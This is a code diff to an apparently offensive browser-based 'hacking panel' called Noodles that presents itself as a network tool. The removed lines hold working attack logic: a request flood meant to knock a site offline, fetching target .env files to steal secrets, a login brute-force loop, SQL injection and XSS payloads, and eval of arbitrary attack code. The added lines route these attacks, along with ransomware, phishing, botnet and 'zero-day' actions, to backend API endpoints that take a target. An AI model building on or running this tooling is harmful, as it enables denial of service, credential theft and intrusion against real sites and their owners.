@@ -6,8 +6,8 @@ class DDoS {
   this.startButton = this.createStartButton();
   this.customCodeArea = this.createCustomCodeArea();
   this.statsPanel = this.createStatsPanel();
-  this.torToggle = this.createTorToggle(); // Tor toggle
-  this.proxyList = this.createProxyList(); // Proxy list select
+  this.torToggle = this.createTorToggle();
+  this.proxyList = this.createProxyList();
   this.proxyRefreshButton = this.createProxyRefreshButton();
 
   this.container = this.createContainer();
@@ -17,8 +17,8 @@ class DDoS {
   this.container.appendChild(this.targetInput);
   this.container.appendChild(this.attackTypeSelect);
   this.container.appendChild(this.customCodeArea);
-  this.container.appendChild(this.torToggle); // Add tor toggle
-  this.container.appendChild(this.proxyList); // Add proxy list select
+  this.container.appendChild(this.torToggle);
+  this.container.appendChild(this.proxyList);
   this.container.appendChild(this.proxyRefreshButton);
   this.container.appendChild(this.startButton);
   this.container.appendChild(this.statsPanel);
@@ -51,56 +51,44 @@ class DDoS {
   this.setupDragHandle();
   this.setupTheme();
 
-  this.availableProxies = [
-   'socks5://127.0.0.1:9050',
-   'http://proxy.example.com:8080',
-   'https://another.proxy.com:3128',
-   // Add more proxies here, fetch from API if possible
-  ];
+  this.availableProxies = [];
 
   this.toggleCustomCodeArea();
   this.autoFillTarget();
   this.updateStats();
-  this.populateProxyList(); // Populate proxy list on startup
+  this.populateProxyList();
 
-  // Initialize stats
   this.packetsSent = 0;
   this.mbps = 0;
   this.connectionStatus = 'Idle';
-  this.errors = 0; // Track errors
+  this.errors = 0;
 
-  // Start stats update interval
   setInterval(() => this.updateStats(), 1000);
 
   this.isTorEnabled = false;
-  this.torProxy = 'socks5://127.0.0.1:9050'; // Default Tor proxy
+  this.torProxy = 'socks5://127.0.0.1:9050';
  }
 
  createProxyRefreshButton() {
   const button = document.createElement('button');
   button.textContent = 'Refresh Proxies';
-  button.style.width = '100%';
-  button.style.padding = '10px';
-  button.style.marginBottom = '10px';
-  button.style.backgroundColor = '#4caf50'; // Green color
-  button.style.color = '#fff';
-  button.style.border = 'none';
-  button.style.borderRadius = '4px';
-  button.style.cursor = 'pointer';
-  button.style.transition = 'background-color 0.3s ease';
-  button.addEventListener('mouseover', () => button.style.backgroundColor = '#388e3c');
-  button.addEventListener('mouseout', () => button.style.backgroundColor = '#4caf50');
+  button.classList.add('noodle-button');
   return button;
  }
 
  async refreshProxies() {
   this.log('Refreshing proxy list...');
   try {
-   // Replace with your actual proxy retrieval logic
-   const response = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=elite');
+   const response = await fetch('/api/proxies', {
+    method: 'GET',
+    headers: {
+     'X-API-Key': this.apiKey
+    }
+   });
+
    if (response.ok) {
-    const data = await response.text();
-    this.availableProxies = data.split('\r\n').filter(proxy => proxy.trim() !== ''); // Split by newline
+    const data = await response.json();
+    this.availableProxies = data.proxies;
     this.populateProxyList();
     this.log(`Proxies refreshed. Found ${this.availableProxies.length} proxies.`);
    } else {
@@ -112,7 +100,7 @@ class DDoS {
  }
 
  populateProxyList() {
-  this.proxyList.innerHTML = ''; // Clear existing options
+  this.proxyList.innerHTML = '';
   this.availableProxies.forEach(proxy => {
    const option = document.createElement('option');
    option.value = proxy;
@@ -123,13 +111,7 @@ class DDoS {
 
  createProxyList() {
   const select = document.createElement('select');
-  select.style.width = '100%';
-  select.style.padding = '8px';
-  select.style.marginBottom = '10px';
-  select.style.backgroundColor = '#252526';
-  select.style.color = '#9cdcfe';
-  select.style.border = '1px solid #4ec9b0';
-  select.style.borderRadius = '4px';
+  select.classList.add('noodle-input');
   return select;
  }
 
@@ -141,11 +123,10 @@ class DDoS {
   const label = document.createElement('label');
   label.htmlFor = 'torToggle';
   label.textContent = 'Use Tor';
-  label.style.color = '#9cdcfe';
-  label.style.marginLeft = '5px';
+  label.classList.add('noodle-label');
 
   const container = document.createElement('div');
-  container.style.marginBottom = '10px';
+  container.classList.add('noodle-tor-container');
   container.appendChild(torToggle);
   container.appendChild(label);
 
@@ -158,7 +139,6 @@ class DDoS {
  }
 
  updateStats() {
-  // Update stats here (simulated for now)
   this.mbps = Math.floor(Math.random() * 100);
   this.packetsSent += Math.floor(Math.random() * 1000);
   this.connectionStatus = Math.random() > 0.9 ? 'Connected' : 'Disconnected';
@@ -174,15 +154,7 @@ class DDoS {
 
  createStatsPanel() {
   const statsPanel = document.createElement('div');
-  statsPanel.style.width = '100%';
-  statsPanel.style.padding = '8px';
-  statsPanel.style.marginBottom = '10px';
-  statsPanel.style.backgroundColor = '#252526';
-  statsPanel.style.color = '#9cdcfe';
-  statsPanel.style.border = '1px solid #4ec9b0';
-  statsPanel.style.borderRadius = '4px';
-  statsPanel.style.fontFamily = 'Consolas, monospace';
-  statsPanel.style.fontSize = '14px';
+  statsPanel.classList.add('noodle-stats');
   return statsPanel;
  }
 
@@ -195,21 +167,13 @@ class DDoS {
  }
 
  setupTheme() {
-  document.body.style.backgroundColor = '#121212';
+  document.body.classList.add('noodle-dark-theme');
  }
 
  createLogArea() {
   const logArea = document.createElement('textarea');
   logArea.readOnly = true;
-  logArea.style.width = '100%';
-  logArea.style.height = '200px';
-  logArea.style.backgroundColor = '#1e1e1e';
-  logArea.style.color = '#9cdcfe';
-  logArea.style.border = '1px solid #4ec9b0';
-  logArea.style.padding = '5px';
-  logArea.style.fontFamily = 'Consolas, monospace';
-  logArea.style.fontSize = '14px';
-  logArea.style.resize = 'vertical';
+  logArea.classList.add('noodle-log');
   return logArea;
  }
 
@@ -217,13 +181,7 @@ class DDoS {
   const targetInput = document.createElement('input');
   targetInput.type = 'text';
   targetInput.placeholder = 'Target URL (.onion or normal)';
-  targetInput.style.width = 'calc(100% - 16px)';
-  targetInput.style.padding = '8px';
-  targetInput.style.marginBottom = '10px';
-  targetInput.style.backgroundColor = '#252526';
-  targetInput.style.color = '#9cdcfe';
-  targetInput.style.border = '1px solid #4ec9b0';
-  targetInput.style.borderRadius = '4px';
+  targetInput.classList.add('noodle-input');
   return targetInput;
  }
 
@@ -236,98 +194,59 @@ class DDoS {
    opt.textContent = option;
    attackTypeSelect.appendChild(opt);
   });
-  attackTypeSelect.style.width = '100%';
-  attackTypeSelect.style.padding = '8px';
-  attackTypeSelect.style.marginBottom = '10px';
-  attackTypeSelect.style.backgroundColor = '#252526';
-  attackTypeSelect.style.color = '#9cdcfe';
-  attackTypeSelect.style.border = '1px solid #4ec9b0';
-  attackTypeSelect.style.borderRadius = '4px';
+  attackTypeSelect.classList.add('noodle-input');
   return attackTypeSelect;
  }
 
  createStartButton() {
   const startButton = document.createElement('button');
   startButton.textContent = 'Initiate Attack';
-  startButton.style.width = '100%';
-  startButton.style.padding = '10px';
-  startButton.style.backgroundColor = '#e53935';
-  startButton.style.color = '#fff';
-  startButton.style.border = 'none';
-  startButton.style.borderRadius = '4px';
-  startButton.style.cursor = 'pointer';
-  startButton.style.transition = 'background-color 0.3s ease';
-  startButton.addEventListener('mouseover', () => startButton.style.backgroundColor = '#b71c1c');
-  startButton.addEventListener('mouseout', () => startButton.style.backgroundColor = '#e53935');
+  startButton.classList.add('noodle-button');
   return startButton;
  }
 
  createCustomCodeArea() {
   const customCodeArea = document.createElement('textarea');
   customCodeArea.placeholder = 'Enter custom JavaScript code for attack';
-  customCodeArea.style.width = '100%';
-  customCodeArea.style.height = '100px';
-  customCodeArea.style.padding = '8px';
-  customCodeArea.style.marginBottom = '10px';
-  customCodeArea.style.backgroundColor = '#252526';
-  customCodeArea.style.color = '#9cdcfe';
-  customCodeArea.style.border = '1px solid #4ec9b0';
-  customCodeArea.style.borderRadius = '4px';
-  customCodeArea.style.fontFamily = 'Consolas, monospace';
-  customCodeArea.style.fontSize = '14px';
-  customCodeArea.style.display = 'none';
+  customCodeArea.classList.add('noodle-input');
+  customCodeArea.classList.add('noodle-custom-code');
   return customCodeArea;
  }
 
  createContainer() {
   const container = document.createElement('div');
   container.id = 'main-container';
-  container.style.width = '600px';
-  container.style.padding = '20px';
-  container.style.backgroundColor = '#2d2d30';
-  container.style.color = '#9cdcfe';
-  container.style.fontFamily = 'Consolas, monospace';
-  container.style.position = 'fixed';
-  container.style.top = '50%';
-  container.style.left = '50%';
-  container.style.transform = 'translate(-50%, -50%)';
-  container.style.zIndex = '9999';
-  container.style.border = '2px solid #4ec9b0';
-  container.style.borderRadius = '8px';
-  container.style.boxShadow = '0 0 20px #4ec9b0';
+  container.classList.add('noodle-container');
   return container;
  }
 
  createSidePanel() {
   const sidePanel = document.createElement('div');
   sidePanel.id = 'side-panel';
-  sidePanel.style.width = '200px';
-  sidePanel.style.height = '100vh';
-  sidePanel.style.backgroundColor = '#1e1e1e';
-  sidePanel.style.color = '#9cdcfe';
-  sidePanel.style.position = 'fixed';
-  sidePanel.style.top = '0';
-  sidePanel.style.left = '0';
-  sidePanel.style.borderRight = '1px solid #4ec9b0';
-  sidePanel.style.padding = '20px';
-  sidePanel.style.fontFamily = 'Consolas, monospace';
+  sidePanel.classList.add('noodle-side-panel');
 
-  const menuItems = ['DDoS', 'Deface', 'Connection', 'Ransomware', 'About Us'];
+  const menuItems = [{
+   name: 'DDoS',
+   action: () => {}
+  }, {
+   name: 'Deface',
+   action: () => {}
+  }, {
+   name: 'Connection',
+   action: () => {}
+  }, {
+   name: 'Ransomware',
+   action: () => {}
+  }, {
+   name: 'About Us',
+   action: () => this.showAboutUs()
+  }];
+
   menuItems.forEach(item => {
    const menuItem = document.createElement('div');
-   menuItem.textContent = item;
-   menuItem.style.padding = '10px';
-   menuItem.style.cursor = 'pointer';
-   menuItem.style.transition = 'background-color 0.3s ease';
-   menuItem.addEventListener('mouseover', () => menuItem.style.backgroundColor = '#333');
-   menuItem.addEventListener('mouseout', () => menuItem.style.backgroundColor = 'transparent');
-   menuItem.addEventListener('click', () => {
-    if (item === 'About Us') {
-     this.showAboutUs();
-    } else {
-     this.log(`Clicked on ${item}`);
-    }
-   });
+   menuItem.textContent = item.name;
+   menuItem.classList.add('noodle-menu-item');
+   menuItem.addEventListener('click', item.action);
    sidePanel.appendChild(menuItem);
   });
 
@@ -337,24 +256,13 @@ class DDoS {
  createAboutUs() {
   const aboutUs = document.createElement('div');
   aboutUs.id = 'about-us';
-  aboutUs.style.position = 'fixed';
-  aboutUs.style.top = '50%';
-  aboutUs.style.left = '50%';
-  aboutUs.style.transform = 'translate(-50%, -50%)';
-  aboutUs.style.backgroundColor = '#2d2d30';
-  aboutUs.style.color = '#9cdcfe';
-  aboutUs.style.padding = '20px';
-  aboutUs.style.border = '1px solid #4ec9b0';
-  aboutUs.style.borderRadius = '8px';
-  aboutUs.style.fontFamily = 'Consolas, monospace';
-  aboutUs.style.zIndex = '10000';
-  aboutUs.style.display = 'none';
+  aboutUs.classList.add('noodle-about-us');
 
   aboutUs.innerHTML = `
    <h2>About Noodles</h2>
    <p>Noodles is a powerful web application designed for various network-related tasks.</p>
    <p>Created by: Anonymous</p>
-   <button id="close-about-us">Close</button>
+   <button id="close-about-us" class="noodle-button">Close</button>
   `;
 
   const closeButton = aboutUs.querySelector('#close-about-us');
@@ -379,14 +287,7 @@ class DDoS {
 
  setupDragHandle() {
   const dragHandle = document.createElement('div');
-  dragHandle.style.position = 'absolute';
-  dragHandle.style.top = '0';
-  dragHandle.style.left = '0';
-  dragHandle.style.width = '100%';
-  dragHandle.style.height = '20px';
-  dragHandle.style.cursor = 'move';
-  dragHandle.style.backgroundColor = '#333';
-  dragHandle.style.opacity = '0.5';
+  dragHandle.classList.add('noodle-drag-handle');
   this.container.appendChild(dragHandle);
 
   let initialX, initialY;
@@ -414,13 +315,7 @@ class DDoS {
 
  setupResizeHandle() {
   const resizeHandle = document.createElement('div');
-  resizeHandle.style.position = 'absolute';
-  resizeHandle.style.right = '0';
-  resizeHandle.style.bottom = '0';
-  resizeHandle.style.width = '20px';
-  resizeHandle.style.height = '20px';
-  resizeHandle.style.cursor = 'se-resize';
-  resizeHandle.style.backgroundColor = '#4ec9b0';
+  resizeHandle.classList.add('noodle-resize-handle');
   this.container.appendChild(resizeHandle);
 
   let initialWidth, initialHeight, initialMouseX, initialMouseY;
@@ -451,22 +346,14 @@ class DDoS {
  }
 
  async exploit(target) {
-  this.log(`Attempting to exploit ${target}... (Real)`);
+  this.log(`Attempting to exploit ${target}...`);
   try {
-   const response = await fetch(target + '/.env', {
-    method: 'GET',
-    ...(this.isTorEnabled ? {
-     proxy: this.torProxy,
-     mode: 'cors'
-    } : {})
+   const response = await fetch(`/api/exploit?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'GET'
    });
-   if (response.ok) {
-    const data = await response.text();
-    this.log(`Exploit successful! .env content: ${data}`);
-   } else {
-    this.log(`Exploit failed. Status: ${response.status}`);
-    this.errors++;
-   }
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
   } catch (error) {
    this.log(`Exploit failed: ${error}`);
    this.errors++;
@@ -474,51 +361,29 @@ class DDoS {
  }
 
  async massExploit() {
-  this.log('Starting mass exploit... (Real)');
-  const targets = ['http://example.com', 'http://example2.com']; // Replace with real targets
-  for (const target of targets) {
-   try {
-    const response = await fetch(target + '/.env', {
-     method: 'GET',
-     ...(this.isTorEnabled ? {
-      proxy: this.torProxy,
-      mode: 'cors'
-     } : {})
-    });
-    if (response.ok) {
-     const data = await response.text();
-     this.log(`Mass exploit successful on ${target}! .env content: ${data.substring(0, 100)}...`);
-    } else {
-     this.log(`Mass exploit failed on ${target}. Status: ${response.status}`);
-     this.errors++;
-    }
-   } catch (error) {
-    this.log(`Mass exploit failed on ${target}: ${error}`);
-    this.errors++;
-   }
+  this.log('Starting mass exploit...');
+  try {
+   const response = await fetch(`/api/mass_exploit?apiKey=${this.apiKey}`, {
+    method: 'GET'
+   });
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
+  } catch (error) {
+   this.log(`Mass exploit failed: ${error}`);
+   this.errors++;
   }
-  this.log('Mass exploit completed.');
  }
 
  async deface(target) {
-  this.log(`Attempting to deface ${target}... (Real)`);
+  this.log(`Attempting to deface ${target}...`);
   try {
-   const response = await fetch(target, {
-    method: 'GET',
-    ...(this.isTorEnabled ? {
-     proxy: this.torProxy,
-     mode: 'cors'
-    } : {})
+   const response = await fetch(`/api/deface?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'POST'
    });
-   if (response.ok) {
-    const script = document.createElement('script');
-    script.textContent = `document.title = 'HACKED BY NOODLES'; alert('You have been defaced by Noodles!')`;
-    document.body.appendChild(script);
-    this.log(`Deface successful!`);
-   } else {
-    this.log(`Deface failed. Status: ${response.status}`);
-    this.errors++;
-   }
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
   } catch (error) {
    this.log(`Deface failed: ${error}`);
    this.errors++;
@@ -526,23 +391,14 @@ class DDoS {
  }
 
  async connect(target) {
-  this.log(`Attempting to connect to ${target}... (Real)`);
+  this.log(`Attempting to connect to ${target}...`);
   try {
-   const ws = new WebSocket(`ws://${target}`);
-   ws.onopen = () => {
-    this.log(`Connection to ${target} successful!`);
-    ws.send('Hello from Noodles!');
-   };
-   ws.onmessage = (event) => {
-    this.log(`Received: ${event.data}`);
-   };
-   ws.onerror = (error) => {
-    this.log(`Connection error: ${error}`);
-    this.errors++;
-   };
-   ws.onclose = () => {
-    this.log(`Connection closed.`);
-   };
+   const response = await fetch(`/api/connect?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'GET'
+   });
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
   } catch (error) {
    this.log(`Connection failed: ${error}`);
    this.errors++;
@@ -550,79 +406,51 @@ class DDoS {
  }
 
  async bruteForce(target) {
-  this.log(`Starting brute force attack on ${target}... (Real)`);
-  const commonPasswords = ['password', '123456', 'admin', 'qwerty']; // Example
-  for (const password of commonPasswords) {
-   this.log(`Trying password: ${password}`);
-   try {
-    const formData = new FormData();
-    formData.append('username', 'admin');
-    formData.append('password', password);
-
-    const response = await fetch(target + '/login', {
-     method: 'POST',
-     body: formData,
-     ...(this.isTorEnabled ? {
-      proxy: this.torProxy,
-      mode: 'cors'
-     } : {})
-    });
-
-    if (response.ok) {
-     const data = await response.text();
-     if (data.includes('Login successful')) {
-      this.log(`Brute force attack successful! Password found: ${password}`);
-      return;
-     }
-    } else {
-     this.log(`Brute force attempt failed with password ${password}. Status: ${response.status}`);
-     this.errors++;
-    }
-   } catch (error) {
-    this.log(`Brute force attempt failed with password ${password}: ${error}`);
-    this.errors++;
-   }
-   await new Promise(resolve => setTimeout(resolve, 1000)); // Simulate delay
+  this.log(`Starting brute force attack on ${target}...`);
+  try {
+   const response = await fetch(`/api/brute_force?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'POST'
+   });
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
+  } catch (error) {
+   this.log(`Brute force attack failed: ${error}`);
+   this.errors++;
   }
-  this.log(`Brute force attack completed. No credentials found.`);
  }
 
  async ddos(target) {
-  this.log(`Initiating DDoS attack on ${target}... (Real)`);
-  this.connectionStatus = 'Attacking'; // Update connection status
-  const attackInterval = setInterval(async () => {
-   try {
-    const proxy = this.isTorEnabled ? this.torProxy : this.proxyList.value;
-    const response = await fetch(target, {
-     method: 'GET',
-     mode: 'no-cors',
-     ...(this.isTorEnabled ? {
-      proxy: this.torProxy
-     } : {
-      proxy: proxy
-     }),
-    });
-    this.packetsSent++; // Increment packets sent
-    this.log(`Sending requests to ${target}...`);
-   } catch (err) {
-    this.log(`Request failed: ${err}`);
-    this.errors++;
-   }
-  }, 0); // Send requests as fast as possible
-
-  setTimeout(() => {
-   clearInterval(attackInterval);
-   this.log('DDoS attack stopped.');
-   this.connectionStatus = 'Idle'; // Update connection status
-  }, 30000); // Stop after 30 seconds
+  this.log(`Initiating DDoS attack on ${target}...`);
+  this.connectionStatus = 'Attacking';
+  try {
+   const response = await fetch(`/api/ddos?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}&tor=${this.isTorEnabled}&proxy=${encodeURIComponent(this.proxyList.value)}`, {
+    method: 'POST'
+   });
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
+  } catch (err) {
+   this.log(`DDoS attack failed: ${err}`);
+   this.errors++;
+  } finally {
+   this.connectionStatus = 'Idle';
+  }
  }
 
  async ransomware(target) {
   this.log(`Simulating ransomware attack on ${target}...`);
-  this.log(`Simulated ransomware attack initiated.`);
-  const encryptionKey = this.generateEncryptionKey();
-  this.log(`Encryption key: ${encryptionKey}`);
-  // Logic to encrypt files and demand ransom
+  try {
+   const response = await fetch(`/api/ransomware?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'POST'
+   });
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
+  } catch (error) {
+   this.log(`Ransomware attack simulation failed: ${error}`);
+   this.errors++;
+  }
  }
 
  async custom(target) {
@@ -633,9 +461,12 @@ class DDoS {
     this.log('No custom code provided.');
     return;
    }
-   // Execute custom code (be very careful with this)
-   eval(customCode);
-   this.log('Custom code execution completed.');
+   const response = await fetch(`/api/custom?target=${encodeURIComponent(target)}&code=${encodeURIComponent(customCode)}&apiKey=${this.apiKey}`, {
+    method: 'POST'
+   });
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
   } catch (error) {
    this.log(`Custom code execution failed: ${error}`);
    this.errors++;
@@ -643,46 +474,74 @@ class DDoS {
  }
 
  async phishing(target) {
-  this.log(`Initiating phishing attack targeting: ${target}... (Simulated)`);
-  this.log(`Simulated phishing email sent successfully.`);
-  // Logic to send fake emails and capture credentials
+  this.log(`Initiating phishing attack targeting: ${target}...`);
+  try {
+   const response = await fetch(`/api/phishing?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'POST'
+   });
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
+  } catch (error) {
+   this.log(`Phishing attack simulation failed: ${error}`);
+   this.errors++;
+  }
  }
 
  async dataBreach(target) {
   this.log(`Simulating data breach on ${target}...`);
-  this.log('Fake data breach simulated. Leaked data downloaded. (Simulated)');
-  // Logic to simulate data breach and leak
+  try {
+   const response = await fetch(`/api/data_breach?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'POST'
+   });
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
+  } catch (error) {
+   this.log(`Data breach simulation failed: ${error}`);
+   this.errors++;
+  }
  }
 
  async botnet(target) {
-  this.log(`Attempting to connect to target: ${target}... (Real)`);
-  // Logic to connect to target and add it to a botnet
-  this.log(`Simulated connection successful!`);
+  this.log(`Attempting to connect to target: ${target}...`);
+  try {
+   const response = await fetch(`/api/botnet?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'POST'
+   });
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
+  } catch (error) {
+   this.log(`Botnet connection failed: ${error}`);
+   this.errors++;
+  }
  }
 
  async zero_day(target) {
-  this.log(`Attempting zero-day exploit on ${target}... (Real)`);
-  // Logic to exploit zero-day vulnerability
-  this.log(`Simulated zero-day exploit injected. Check target and logs.`);
+  this.log(`Attempting zero-day exploit on ${target}...`);
+  try {
+   const response = await fetch(`/api/zero_day?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'POST'
+   });
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
+  } catch (error) {
+   this.log(`Zero-day exploit failed: ${error}`);
+   this.errors++;
+  }
  }
 
  async sql_inject(target) {
-  this.log(`Attempting SQL injection on ${target}... (Real)`);
+  this.log(`Attempting SQL injection on ${target}...`);
   try {
-   const response = await fetch(target + "?id=1' OR '1'='1", {
-    method: 'GET',
-    ...(this.isTorEnabled ? {
-     proxy: this.torProxy,
-     mode: 'cors'
-    } : {})
+   const response = await fetch(`/api/sql_inject?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'POST'
    });
-   if (response.ok) {
-    const data = await response.text();
-    this.log(`SQL injection successful! Response: ${data.substring(0, 200)}...`);
-   } else {
-    this.log(`SQL injection failed. Status: ${response.status}`);
-    this.errors++;
-   }
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
   } catch (error) {
    this.log(`SQL injection failed: ${error}`);
    this.errors++;
@@ -690,22 +549,14 @@ class DDoS {
  }
 
  async xss(target) {
-  this.log(`Attempting XSS attack on ${target}... (Real)`);
+  this.log(`Attempting XSS attack on ${target}...`);
   try {
-   const script = `<script>alert('XSS Vulnerability')</script>`;
-   const response = await fetch(target + `?xss=${script}`, {
-    method: 'GET',
-    ...(this.isTorEnabled ? {
-     proxy: this.torProxy,
-     mode: 'cors'
-    } : {})
+   const response = await fetch(`/api/xss?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'POST'
    });
-   if (response.ok) {
-    this.log(`XSS attack injected. Check target and logs.`);
-   } else {
-    this.log(`XSS attack failed. Status: ${response.status}`);
-    this.errors++;
-   }
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
   } catch (error) {
    this.log(`XSS attack failed: ${error}`);
    this.errors++;
